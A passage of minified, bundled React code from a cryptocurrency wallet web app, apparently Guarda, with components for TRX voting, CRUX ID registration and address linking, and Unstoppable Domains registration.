            }, l && O.createElement("span", null, l)), !n && O.createElement("div", {
                className: iV
            }, "Step 2 of 3"), O.createElement("div", {
                className: oV
            }, w ? O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/receive`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Close")) : O.createElement(Yl, {
                color: "blue",
                onClick: handleConfirm,
                isLoading: n
            }, "Confirm"))))) : O.createElement(O.Fragment, null)
        }
        var SH = a(66342)
          , CH = a(23647)
          , NH = a(5332);
        let TH;
        !function(e) {
            e.NEVER = "never";
            e.ERROR = "error";
            e.SUCCESSFUL = "successful"
        }(TH || (TH = {}));
        const useVote = () => {
            const e = (0,
            $.v9)(tu)
              , t = (0,
            O.useRef)(null)
              , [a,n] = (0,
            O.useState)()
              , [r,l] = (0,
            O.useState)(!0)
              , [s,i] = (0,
            O.useState)(0)
              , {listOfRepresentatives: o, isLoading: c} = nH()
              , {validatorAddress: u, validatorTitle: d} = oG({
                ticker: "trx"
            })
              , [m,p] = (0,
            O.useState)(TH.NEVER)
              , votesByWallet = async e => {
                try {
                    var a;
                    l(!0);
                    const r = await Se.Z.getApiByWallet({
                        currency: e.currency,
                        family: e.family,
                        precision: Number(e.precision),
                        smartContract: e.smartContract
                    })
                      , s = await r.getVotesByAddress({
                        address: e.address,
                        abortSignal: null == t || null === (a = t.current) || void 0 === a ? void 0 : a.signal
                    });
                    n({
                        candidates: s.candidates.map((e => ({
                            ...e,
                            id: Math.random()
                        }))),
                        availableVotes: s.availableVotes
                    })
                } catch (e) {
                    p(TH.ERROR)
                } finally {
                    l(!1)
                }
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (void 0 === a)
                    return;
                const e = a.candidates.reduce(( (e, t) => t.votes + e), 0);
                i(a.availableVotes - e)
            }
            ), [a]);
            (0,
            O.useEffect)(( () => {
                if (null != e) {
                    t.current = new AbortController;
                    votesByWallet(e);
                    return () => {
                        var e;
                        null === (e = t.current) || void 0 === e || e.abort()
                    }
                }
            }
            ), [e]);
            const handleSetValidator = (e, t) => {
                n((a => {
                    if (void 0 !== a)
                        return {
                            ...a,
                            candidates: a.candidates.map((a => a.id === t.id ? {
                                candidateAddress: e.address,
                                candidateName: e.title,
                                votes: t.votes,
                                id: t.id
                            } : a))
                        }
                }
                ))
            }
              , selectedRepresentative = e => {
                const t = undefined;
                return o.find((t => t.address === e.candidateAddress))
            }
              , handleAddSuperRepresentative = () => {
                void 0 !== a && n((e => {
                    if (void 0 !== e)
                        return {
                            ...e,
                            candidates: [...e.candidates, {
                                candidateAddress: u,
                                candidateName: d,
                                votes: "0",
                                id: Math.random()
                            }]
                        }
                }
                ))
            }
              , handleDropSuperRepresentative = e => {
                n((t => {
                    if (void 0 !== t)
                        return {
                            ...t,
                            candidates: t.candidates.filter((t => t.id !== e))
                        }
                }
                ))
            }
              , isInteger = e => {
                const t = Number(e);
                return !isNaN(t) && Number.isInteger(t)
            }
              , handleUpdateValue = (e, t) => {
                if (!1 === isInteger(e))
                    return;
                const a = +e;
                n((e => {
                    if (void 0 !== e)
                        return {
                            ...e,
                            candidates: e.candidates.map((e => e.id === t.id ? {
                                ...t,
                                votes: a > t.votes ? s >= a ? a : t.votes + s : a
                            } : e))
                        }
                }
                ))
            }
              , handleSave = async () => {
                if (void 0 !== a && null !== e)
                    try {
                        var t;
                        const n = await Se.Z.getApiByWallet({
                            currency: e.currency,
                            family: e.family,
                            precision: Number(e.precision),
                            smartContract: e.smartContract
                        })
                          , r = await n.changeVotes({
                            votes: null == a ? void 0 : a.candidates.map((e => ({
                                address: e.candidateAddress,
                                count: e.votes
                            }))),
                            address: e.address,
                            privateKey: e.privateKey
                        });
                        if (r.hash) {
                            p(TH.SUCCESSFUL);
                            return
                        }
                        throw new Error(null !== (t = null == r ? void 0 : r.error) && void 0 !== t ? t : "Something went wrong")
                    } catch (e) {
                        p(TH.ERROR)
                    }
            }
              , f = undefined;
            return {
                isLoading: (0,
                O.useMemo)(( () => r || c), [r, c]),
                votes: a,
                freeVotes: s,
                listOfRepresentatives: o,
                resultStatus: m,
                selectedRepresentative,
                handleSave,
                handleUpdateValue,
                handleDropSuperRepresentative,
                handleAddSuperRepresentative,
                handleSetValidator
            }
        }
          , AH = "vote_wrapper_tUN9T main_block_15zml"
          , xH = "vote_total_3mK-b"
          , IH = "vote_free_3AZLs"
          , PH = "vote_input_PAyZs"
          , LH = "vote_voteElements_2r3Zd"
          , FH = "vote_drop_1eHC5"
          , WH = "vote_row_2tU9J"
          , RH = "vote_value_1jIp5"
          , BH = "vote_button_1EXQd"
          , OH = "vote_message_1wkXq"
          , DH = "vote_loader_1vSOP"
          , VoteTrx = () => {
            const {votes: e, freeVotes: t, isLoading: a, listOfRepresentatives: n, resultStatus: r, selectedRepresentative: l, handleSave: s, handleUpdateValue: i, handleDropSuperRepresentative: o, handleAddSuperRepresentative: c, handleSetValidator: u} = useVote();
            return a ? O.createElement(sG, {
                wallet: void 0,
                styles: {}
            }, O.createElement("div", {
                className: AH
            }, O.createElement("h2", null, "Votes"), O.createElement(loader, {
                visible: !0,
                width: 30,
                className: DH
            }))) : O.createElement(sG, {
                wallet: void 0,
                styles: {}
            }, O.createElement("div", {
                className: AH
            }, O.createElement("h2", null, "Votes"), O.createElement("div", {
                className: xH
            }, "Total votes: ", O.createElement("span", {
                className: RH
            }, null == e ? void 0 : e.availableVotes)), O.createElement("div", {
                className: IH
            }, "Free votes: ", O.createElement("span", {
                className: RH
            }, t)), O.createElement("div", {
                className: LH
            }, null == e ? void 0 : e.candidates.map((e => O.createElement(O.Fragment, {
                key: e.id
            }, O.createElement("div", null, O.createElement(Ea, {
                value: e.votes,
                onChange: t => i(t.currentTarget.value, e),
                autoComplete: "off",
                className: PH
            })), O.createElement("div", null, O.createElement(Lp, {
                selected: l(e),
                isLoading: a,
                items: n,
                placeholder: "Select Validator",
                emptyPlaceholder: "Validators not found",
                onChange: t => u(t, e)
            })), O.createElement("div", {
                className: FH,
                onClick: () => o(e.id)
            }, "Drop"))))), O.createElement(Yl, {
                color: "blue",
                onClick: c,
                className: BH
            }, "Add Super Representative"), O.createElement(Yl, {
                color: "blue",
                onClick: s,
                className: BH
            }, "Save"), r === TH.SUCCESSFUL ? O.createElement(ui_message, {
                type: "info",
                className: OH
            }, "Votes saved successfully") : null, r === TH.ERROR ? O.createElement(ui_message, {
                type: "error",
                className: OH
            }, "Something went wrong") : null))
        }
          , MH = "register-address_wrapper_1eN9C app_wrapperBlock_2EpA3"
          , UH = "register-address_wrapperForm_1NW9d app_wrapperLeftBlock_3QLZp"
          , GH = "register-address_footerBlock_1LjsE app_footerBlock_n86Kc"
          , VH = "register-address_stepInfo_10roP app_stepInfo_2VLE6"
          , KH = "register-address_toggleAdvancedOptions_2H3dO"
          , HH = "register-address_noti_2s6SB"
          , zH = "register-address_cruxPlaceholder_3fUVE"
          , jH = "register-address_loading_19Cz6"
          , $H = "register-address_loaderWrapper_77Kj_";
        let ZH = null
          , YH = !1;
        function CruxRegisterAddress() {
            const e = (0,
            $.I0)()
              , t = useLocationSearch()
              , a = O.createRef()
              , n = (0,
            j.k6)()
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)(null)
              , [m,p] = (0,
            O.useState)(null)
              , [f,E] = (0,
            O.useState)(null)
              , [h,g] = (0,
            O.useState)(!1)
              , [y,v] = (0,
            O.useState)(t.accountName || "")
              , setProcess = async e => {
                d(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (f) {
                    YH = !1;
                    setProcess(null);
                    c(!1)
                }
            }
            ), [f]);
            (0,
            O.useEffect)(( () => {
                u && !o && c(!0);
                if (!u) {
                    YH = !1;
                    c(!1)
                }
            }
            ), [u]);
            (0,
            O.useEffect)(( () => {
                r && l(!1)
            }
            ), [y]);
            (0,
            O.useEffect)(( () => {
                async function fetchCruxAccount() {
                    const t = await e(getSecureData(Qe));
                    t && t.accountName && p(t.accountName)
                }
                fetchCruxAccount()
            }
            ), []);
            async function validateAccountName() {
                if (y) {
                    i(!0);
                    try {
                        const e = await Se.Z.getApiByCurrency("crux")
                          , {status: t} = await e.isNameAvailable({
                            name: y
                        });
                        g(t)
                    } catch (e) {
                        g(!1)
                    }
                    i(!1)
                } else
                    i(!1)
            }
            (0,
            O.useEffect)(( () => {
                clearTimeout(ZH);
                h || i(!0);
                ZH = setTimeout(validateAccountName, 500)
            }
            ), [y]);
            async function handleNext() {
                if (YH)
                    return;
                const t = await e(getSecureData(Qe));
                t && t.accountName && n.push({
                    pathname: (0,
                    M.RU)("/crux/select-wallets"),
                    search: objectToString({
                        type: "update"
                    })
                });
                const {isValid: r} = a.current.validate();
                if (r) {
                    try {
                        await setProcess("Loading CRUX Blockchain adapter...");
                        const t = await Se.Z.getApiByCurrency("crux")
                          , a = await t.createWallet();
                        await setProcess("Registration Account Name");
                        await t.registerAddressName({
                            privateKey: a.privateKey,
                            name: y
                        });
                        await setProcess("Update secure storage");
                        await e(setSecureData(Qe, {
                            accountName: y,
                            privateKey: a.privateKey
                        }));
                        await e(handleDownload(Sm.FORCE));
                        cc.$.send(cc.d.CRUX_REGISTER_WALLET, y)
                    } catch (e) {
                        E("Failed create account");
                        return
                    }
                    n.push({
                        pathname: (0,
                        M.RU)("/crux/select-wallets"),
                        search: objectToString({
                            accountName: y
                        })
                    })
                } else
                    l(!0)
            }
            function handleChangeCruxAccount(e) {
                let {target: {value: t}} = e;
                v(t)
            }
            function localValidator(e) {
                return [{
                    rule: e => e.length > 0,
                    message: "Account name cannot be empty"
                }, {
                    rule: e => e.length <= 20,
                    message: "No more than 20 symbols"
                }, {
                    rule: e => e.length > 3,
                    message: "No less than 4 symbols"
                }, {
                    rule: e => /^[a-zA-Z0-9][0-9a-zA-Z_-]+[a-zA-Z0-9]$/.test(e),
                    message: "Account name is invalid"
                }, {
                    rule: () => !!s || e,
                    message: "An address with the same name already exists"
                }]
            }
            return O.createElement("div", {
                className: MH
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: VU,
                style: {
                    width: "90%"
                }
            }, "Manage your human-readable address")), O.createElement("div", {
                className: UH
            }, O.createElement(sf(), {
                ref: a
            }, O.createElement(label, null, "What is CRUXPay?"), O.createElement("p", null, "CRUXPay is an open payment protocol that provides users with the ability to send and receive any coins and tokens using unique usernames (CRUX ID) instead of hard-to-remember blockchain addresses.", O.createElement("br", null), O.createElement("br", null), "It's completely free of charge to create the CRUX ID.", O.createElement("br", null), O.createElement("br", null)), !m && O.createElement(O.Fragment, null, O.createElement(label, null, "Create new CRUX ID"), O.createElement(lf.ValidatorField, {
                rules: localValidator(h),
                value: y
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement("div", {
                    className: "relative"
                }, O.createElement(pa, {
                    isInvalid: !t && r && !s || !h && !s && !!y.length,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    maxLength: 20,
                    onEnter: handleNext,
                    placeholder: "Enter account name",
                    value: y,
                    onChange: handleChangeCruxAccount
                })), O.createElement("div", {
                    className: jH
                }, O.createElement(LoaderDots, {
                    visible: s
                })), O.createElement("div", {
                    className: zH
                }, "@guarda.crux"))
            }
            )), O.createElement("p", {
                className: HH
            }, "CRUX ID should be from 4 to 20 lowercase alphanumeric characters. From special characters, only '_' & '-' are allowed."), O.createElement(lf.ValidatorField, {
                rules: zf.bool,
                value: !s
            })), !!f && O.createElement(ui_message, {
                type: "error"
            }, "Failed to create CRUX ID."), O.createElement("div", {
                className: GH
            }, o && O.createElement("div", {
                className: $H
            }, u && O.createElement("span", null, u)), !o && O.createElement("div", {
                className: VH
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big",
                isLoading: o
            }, m ? "Update" : "Create and continue")))))
        }
        const qH = "select-wallets_emptyState_XAhEG"
          , XH = "select-wallets_walletElement_3DCgu"
          , QH = "select-wallets_walletWrapper_l7M3P"
          , JH = "select-wallets_loadingOverlay_1TsMF";
        let ez = !1;
        const tz = "bch,bsv,btg,rvn,dash,btc,dcr,dgb,doge,grs,kmd,ltc,qtum,zec,firo,etc,eth,ada,atom,eos,lsk,neo,waves,xlm,kin,xmr,xtz,xrp,xem,zen,trx,bnb,vet,ont,nano".split(",");
        function select_wallets_BoardSendConfirm() {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = O.createRef()
              , r = (0,
            $.I0)()
              , l = (0,
            $.v9)($c)
              , s = (0,
            $.v9)(selectedAttachedWallets)
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(null)
              , [p,f] = (0,
            O.useState)(null)
              , [E,h] = (0,
            O.useState)(!1)
              , [g,y] = (0,
            O.useState)({})
              , [v,_] = (0,
            O.useState)({})
              , [w,b] = (0,
            O.useState)(!1)
              , setProcess = async e => {
                m(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                E && h(!1)
            }
            ), [v, g]);
            (0,
            O.useEffect)(( () => {
                if ("update" === e.type) {
                    u(!0);
                    r(fetchAttachedWallets()).then(( () => {
                        u(!1)
                    }
                    ))
                }
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                "update" === e.type && 0 !== l.length && Object.keys(s).length > 0 && setInitialWallets();
                function findWalletByAddressCurrency(e, t) {
                    return l.find((a => a.address === e && a.currency === t))
                }
                async function setInitialWallets() {
                    u(!0);
                    const e = undefined;
                    if (!await r(getSecureData(Qe))) {
                        u(!1);
                        return
                    }
                    const t = Object.keys(s);
                    if (t.length) {
                        t.forEach((e => {
                            const t = undefined
                              , a = findWalletByAddressCurrency(s[e].addressHash, e);
                            if (a) {
                                g[e] = a;
                                v[e] = !0
                            }
                        }
                        ));
                        y({
                            ...g
                        });
                        _({
                            ...v
                        });
                        u(!1)
                    } else
                        u(!1)
                }
            }
            ), [s]);
            (0,
            O.useEffect)(( () => {
                if (p) {
                    ez = !1;
                    setProcess(null);
                    o(!1)
                }
            }
            ), [p]);
            (0,
            O.useEffect)(( () => {
                d && !i && o(!0);
                if (!d) {
                    ez = !1;
                    o(!1)
                }
            }
            ), [d]);
            const handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/crux"),
                    search: a.search
                })
            }
              , handleConfirm = async () => {
                if (ez)
                    return;
                if (c)
                    return;
                const {isValid: e} = n.current.validate();
                if (!e) {
                    h(!0);
                    return
                }
                ez = !0;
                f(null);
                await setProcess("Loading CRUX Blockchain adapter...");
                const a = await Se.Z.getApiByCurrency("crux");
                await setProcess("Preparing transaction...");
                const l = Object.values(g).map((e => v[(0,
                be.rX)(e.currency)] ? {
                    currency: (0,
                    be.rX)(e.currency),
                    address: e.address
                } : null)).filter(Boolean);
                try {
                    const e = await r(getSecureData(Qe));
                    await setProcess("Linking addresses");
                    await a.addPublicAddresses({
                        addressArray: l,
                        privateKey: e.privateKey
                    });
                    t.push({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: objectToString({
                            type: "cruxUpdate",
                            accountName: e.accountName
                        })
                    });
                    ez = !1
                } catch (e) {
                    f(!0)
                }
            }
              , k = l.reduce(( (e, t) => {
                if (-1 === tz.indexOf((0,
                be.rX)(t.currency)))
                    return e;
                e[(0,
                be.rX)(t.currency)] || (e[(0,
                be.rX)(t.currency)] = []);
                e[(0,
                be.rX)(t.currency)].push(t);
                return e
            }
            ), {})
              , S = Object.keys(k)
              , C = Object.values(v).filter(Boolean)
              , N = S.length === C.length && C.length > 0;
            (0,
            O.useEffect)(( () => {
                if (!w && l.length && Object.keys(k).length && "update" !== e.type) {
                    S.forEach((e => {
                        const t = k[e][0];
                        if (t) {
                            v[(0,
                            be.rX)(e)] = !0;
                            g[(0,
                            be.rX)(e)] = t
                        }
                    }
                    ));
                    y({
                        ...g
                    });
                    _({
                        ...v
                    });
                    b(!0)
                }
            }
            ), [l]);
            function handleSelectAll() {
                const e = !N;
                S.forEach((t => {
                    v[t] = e
                }
                ));
                _({
                    ...v
                })
            }
            function handleChangeWallet(e) {
                return function onChangeWallet(t) {
                    g[e] = t;
                    y({
                        ...g
                    });
                    v[e] = !0;
                    _({
                        ...v
                    })
                }
            }
            function handleCheckedCurrency(e) {
                return function onChangeWallet() {
                    v[e] = !v[e];
                    _({
                        ...v
                    })
                }
            }
            const localValidatorWallet = e => [{
                rule: t => !e || !!t,
                message: "No wallet selected"
            }];
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: VU
            }, "Manage your human-readable address")), O.createElement("div", {
                className: iM
            }, O.createElement(sf(), {
                ref: n
            }, O.createElement(label, null, "What is CRUXPay?"), O.createElement("p", null, "You can only link one address from a particular blockchain to your CRUX ID. However, you can easily modify the addresses linked to your CRUX ID."), O.createElement(label, null, "Link addresses to your CRUX ID"), O.createElement("div", {
                className: "relative"
            }, c && O.createElement("div", {
                className: JH
            }, O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement(mp, {
                onChange: handleSelectAll,
                checked: N
            }, "Select all"), O.createElement("div", {
                className: dM
            }), 0 === l.length && O.createElement("div", {
                className: qH
            }, O.createElement("p", null, "You need wallets to proceed")), Object.keys(k).map((e => O.createElement(O.Fragment, {
                key: `item-select${e}`
            }, O.createElement("div", {
                className: XH
            }, O.createElement(mp, {
                onChange: handleCheckedCurrency(e),
                checked: v[e] || !1
            }, (0,
            be.xG)(e)), O.createElement("div", {
                className: QH
            }, O.createElement(lf.ValidatorField, {
                rules: localValidatorWallet(v[e]),
                value: g[e]
            }, (t => {
                let {isValid: a, message: n} = t;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !a && E,
                    message: n
                }, O.createElement(Mh, {
                    withoutSubwallets: !0,
                    wallets: k[e],
                    onChange: handleChangeWallet(e),
                    selectedWallet: g[e]
                }))
            }
            )))))))), !!p && O.createElement(ui_message, {
                type: "error"
            }, "Failed to link addresses"), O.createElement("div", {
                className: dM
            }), O.createElement("div", {
                className: fM
            }, i && O.createElement("div", {
                className: yM
            }, d && O.createElement("span", null, d)), !i && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !i && "update" !== e.type && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                onClick: handleConfirm,
                color: "blue",
                size: "big",
                isLoading: i
            }, "Link"))))))
        }
        const az = "register-address_wrapper_26TQ6 app_wrapperBlock_2EpA3"
          , nz = "register-address_wrapperForm_3e-K3 app_wrapperLeftBlock_3QLZp"
          , rz = "register-address_footerBlock_3Z7yI app_footerBlock_n86Kc"
          , lz = "register-address_stepInfo_3KQ39 app_stepInfo_2VLE6"
          , sz = "register-address_toggleAdvancedOptions_2WaRr"
          , iz = "register-address_noti_1TsY_"
          , oz = "register-address_price_2QVrX"
          , cz = "register-address_cruxPlaceholder_1Q595"
          , uz = "register-address_loading_r1jNw"
          , dz = "register-address_loaderWrapper_nw9OW";
        let mz = null;
        const pz = !1;
        function UdRegisterAddress() {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            $.v9)($c)
              , n = O.createRef()
              , r = a.filter((e => "eth" === e.currency && !e.isWatchOnly && !e.isHw))
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(r[0])
              , [p,f] = (0,
            O.useState)(e.domainName || "")
              , [E,h] = (0,
            O.useState)(null)
              , [g,y] = (0,
            O.useState)(e.email || "");
            (0,
            O.useEffect)(( () => {
                l && s(!1)
            }
            ), [p, g, d]);
            async function validateDomainName() {
                if (p) {
                    o(!0);
                    try {
                        const {data: e} = await Jf().get(`https://unstoppabledomains.com/api/v1/resellers/guarda/domains/${p}.crypto`);
                        h(e.domain.reselling);
                        u(null === e.domain.owner && e.domain.reselling)
                    } catch (e) {
                        u(!1)
                    }
                    o(!1)
                } else
                    o(!1)
            }
            (0,
            O.useEffect)(( () => {
                clearTimeout(mz);
                c || o(!0);
                mz = setTimeout(validateDomainName, 500)
            }
            ), [p]);
            async function handleNext() {
                pz;
                const {isValid: e} = n.current.validate();
                if (e) {
                    cc.$.send(cc.d.UD_REGISTER_START);
                    s(!1);
                    t.push({
                        pathname: (0,
                        M.RU)("/ud/select-wallets"),
                        search: objectToString({
                            email: g,
                            domainName: p,
                            wallet: d.uuid
                        })
                    })
                } else
                    s(!0)
            }
            function handleChangeDomain(e) {
                let {target: {value: t}} = e;
                f(t)
            }
            function handleChangeEmail(e) {
                let {target: {value: t}} = e;
                y(t)
            }
            function handleChangeUdWallet(e) {
                m(e)
            }
            function localValidator(e) {
                return [{
                    rule: e => e.length > 0,
                    message: "Account name cannot be empty"
                }, {
                    rule: e => e.length < 40,
                    message: "No more than 40 symbols"
                }, {
                    rule: e => e.length > 2,
                    message: "No less than 3 symbols"
                }, {
                    rule: e => /^[a-zA-Z0-9][0-9a-zA-Z_-]+[a-zA-Z0-9]$/.test(e),
                    message: "Account name is invalid"
                }, {
                    rule: () => !!i || e,
                    message: "An address with the same name already exists"
                }]
            }
            return O.createElement("div", {
                className: az
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: VU
            }, "Manage your human-readable address")), O.createElement("div", {
                className: nz
            }, O.createElement(sf(), {
                ref: n
            }, O.createElement(label, null, "What is Unstoppable Domains?"), O.createElement("p", null, "Unstoppable Domains (UD) provides users with human-readable crypto domains. Link your wallet to a blockchain domain and replace lenghty cryptocurrency addresses with a convenient name. A blockchain domain can also be used to launch a website.", O.createElement("br", null), O.createElement("br", null), "UD charges a fee for domain registration.", O.createElement("br", null), O.createElement("br", null), "Read more about UD in our ", O.createElement("a", {
                href: "https://support.guarda.com/assets/unstoppable-domains-and-their-human-readable-addresses",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Support Center ", O.createElement("img", {
                src: Bp,
                alt: ""
            })), O.createElement("br", null), O.createElement("br", null)), O.createElement(label, null, "Create new Unstoppable Domain"), O.createElement(lf.ValidatorField, {
                rules: localValidator(c),
                value: p
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement("div", {
                    className: "relative"
                }, O.createElement(pa, {
                    isInvalid: !t && l && !i || !c && !i && !!p.length,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    maxLength: 40,
                    onEnter: handleNext,
                    placeholder: "Enter domain name",
                    value: p,
                    onChange: handleChangeDomain
                })), O.createElement("span", {
                    className: uz
                }, O.createElement(LoaderDots, {
                    visible: i
                })), O.createElement("div", {
                    className: cz
                }, ".crypto"))
            }
            )), E && O.createElement("p", {
                className: oz
            }, "Available for ", E.availableForFree ? "free" : `${E.price}$`), O.createElement("p", {
                className: iz
            }, "Address should be between 5 to 253 lowercase Latin alphanumeric characters. Only '-' special character allowed."), O.createElement("br", null), O.createElement(label, null, "Email"), O.createElement(lf.ValidatorField, {
                rules: zf.email,
                value: g
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement("div", {
                    className: "relative"
                }, O.createElement(pa, {
                    isInvalid: !t && l,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    maxLength: 40,
                    onEnter: handleNext,
                    placeholder: "example@guarda.com",
                    value: g,
                    onChange: handleChangeEmail
                })))
            }
            )), O.createElement(label, null, "Wallet for domain managing"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: d
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && l,
                    message: a
                }, O.createElement(Mh, {
                    withoutSubwallets: !0,
                    wallets: r,
                    onChange: handleChangeUdWallet,
                    selectedWallet: d,
                    customFilter: e => onCustomFilterWallets(e, ["eth"]),
                    udManagingCurrencies: !0
                }))
            }
            )), O.createElement(lf.ValidatorField, {
                rules: zf.bool,
                value: !i
            }), O.createElement("div", {
                className: rz
            }, O.createElement("div", {
                className: lz
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Continue")))))
        }
        const fz = "select-wallets_emptyState_DsDTN"
          , Ez = "select-wallets_walletElement_2wwnI"
          , hz = "select-wallets_walletWrapper_n0l5F"
          , gz = "select-wallets_loadingOverlay_1UvVd"
          , yz = "select-wallets_wrapperButtons_1ckZK";
        let vz = !1;
        const _z = "bch,bsv,btg,rvn,dash,btc,dcr,dgb,doge,grs,kmd,ltc,qtum,zec,firo,etc,eth,ada,atom,eos,lsk,neo,waves,xlm,kin,xmr,xtz,xrp,xem,trx,bnb,vet,ont".split(",");
        function UdSelectWallets() {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = O.createRef()
              , r = (0,
            $.I0)()
              , l = (0,
            $.v9)($c)
              , s = (0,
            $.v9)(selectedAttachedWallets)
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)({})
              , [p,f] = (0,
            O.useState)({})
              , [E,h] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)(( () => {
                c && u(!1)
            }
            ), [p, d]);
            (0,
            O.useEffect)(( () => {
                if ("update" === e.type) {
                    o(!0);
                    r(fetchAttachedWallets()).then(( () => {
                        o(!1)
                    }
                    ))
                }
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                "update" === e.type && 0 !== l.length && Object.keys(s).length > 0 && setInitialWallets();
                function findWalletByAddressCurrency(e, t) {
                    return l.find((a => a.address === e && (0,
                    be.rX)(a.currency) === t))
                }
                async function setInitialWallets() {
                    o(!0);
                    const e = undefined;
                    if (!await r(getSecureData(Qe))) {
                        o(!1);
                        return
                    }
                    const t = Object.keys(s);
                    if (t.length) {
                        t.forEach((e => {
                            const t = undefined
                              , a = findWalletByAddressCurrency(s[e].addressHash, e);
                            if (a) {
                                d[(0,
                                be.rX)(e)] = a;
                                p[(0,
                                be.rX)(e)] = !0
                            }
                        }
                        ));
                        m({
                            ...d
                        });
                        f({
                            ...p
                        });
                        o(!1)
                    } else
                        o(!1)
                }
            }
            ), [s]);
            const handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/ud"),
                    search: a.search
                })
            }
              , handleConfirm = async () => {
                if (vz)
                    return;
                if (i)
                    return;
                const {isValid: a} = n.current.validate();
                if (!a) {
                    u(!0);
                    return
                }
                vz = !0;
                const r = Object.values(d).reduce(( (e, t) => {
                    p[(0,
                    be.rX)(t.currency)] && (e[(0,
                    be.rX)(t.currency)] = t.uuid);
                    return e
                }
                ), {});
                cc.$.send(cc.d.UD_SELECT_WALLET_COMPLETE);
                t.push({
                    pathname: (0,
                    M.RU)("/ud/payment"),
                    search: objectToString({
                        ...e,
                        wallets: r
                    })
                });
                vz = !1
            }
              , g = l.reduce(( (e, t) => {
                if (-1 === _z.indexOf((0,
                be.rX)(t.currency)))
                    return e;
                e[(0,
                be.rX)(t.currency)] || (e[(0,
                be.rX)(t.currency)] = []);
                e[(0,
                be.rX)(t.currency)].push(t);
                return e
            }
            ), {})
              , y = Object.keys(g)
              , v = Object.values(p).filter(Boolean)
              , _ = y.length === v.length && v.length > 0;
            (0,
            O.useEffect)(( () => {
                if (!E && l.length && Object.keys(g).length && "update" !== e.type) {
                    y.forEach((e => {
                        const t = g[e][0];
                        if (t) {
                            p[e] = !0;
                            d[e] = t
                        }
                    }
                    ));
                    m({
                        ...d
                    });
                    f({
                        ...p
                    });
                    h(!0)
                }
            }
            ), [l]);
            function handleSelectAll() {
                const e = !_;
                y.forEach((t => {
                    p[t] = e
                }
                ));
                f({
                    ...p
                })
            }
            function handleChangeWallet(e) {
                return function onChangeWallet(t) {
                    d[e] = t;
                    m({
                        ...d
                    });
                    p[e] = !0;
                    f({
                        ...p
                    })
                }
            }
            function handleCheckedCurrency(e) {
                return function onChangeWallet() {
                    p[e] = !p[e];
                    f({
                        ...p
                    })
                }
            }
            const localValidatorWallet = e => [{
                rule: t => !e || !!t,
                message: "No wallet selected"
            }];
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: VU
            }, "Manage your human-readable address")), O.createElement("div", {
                className: iM
            }, O.createElement(sf(), {
                ref: n
            }, O.createElement(label, null, "Link addresses to ", e.domainName, ".crypto"), O.createElement("p", null, "You can only link one address of a particular blockchain to your human-readable address at a time. You can change the binding in your", " ", O.createElement("a", {
                href: "https://unstoppabledomains.com/domains",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Unstoppable Domain Account ", O.createElement("img", {
                src: Bp,
                alt: ""
            }))), O.createElement("div", {
                className: "relative"
            }, i && O.createElement("div", {
                className: gz
            }, O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement(mp, {
                onChange: handleSelectAll,
                checked: _
            }, "Select all"), O.createElement("div", {
                className: dM
            }), 0 === l.length && O.createElement("div", {
                className: fz
            }, O.createElement("p", null, "You need wallets to proceed")), Object.keys(g).map((e => O.createElement(O.Fragment, {
                key: `item-select${e}`
            }, O.createElement("div", {
                className: Ez
            }, O.createElement(mp, {
                onChange: handleCheckedCurrency(e),
                checked: p[e] || !1
            }, (0,
            be.xG)(e)), O.createElement("div", {
                className: hz
            }, O.createElement(lf.ValidatorField, {
                rules: localValidatorWallet(p[e]),
                value: d[e]
            }, (t => {
                let {isValid: a, message: n} = t;
                return O.createElement(pa, {
                    isSelect: !0,
